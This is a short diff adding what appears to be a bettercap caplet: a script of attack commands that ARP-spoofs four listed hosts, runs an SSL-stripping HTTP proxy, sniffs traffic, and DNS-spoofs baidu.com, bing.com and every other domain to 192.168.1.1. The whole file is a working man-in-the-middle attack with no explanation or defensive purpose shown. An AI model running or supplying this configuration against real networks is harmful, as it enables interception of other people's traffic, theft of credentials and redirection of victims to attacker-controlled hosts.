@@ -1,0 +1,12 @@
+set http.proxy.sslstrip true
+set net.sniff.verbose false
+set arp.spoof.targets 192.168.1.6, 114.246.169.186, 10.211.55.7, 192.168.1.5
+arp.spoof on
+http.proxy on
+net.sniff on
+
+set dns.spoof.domains baidu.com, bing.com
+set dns.spoof.address 192.168.1.1
+
+set dns.spoof.all true
+dns.spoof on
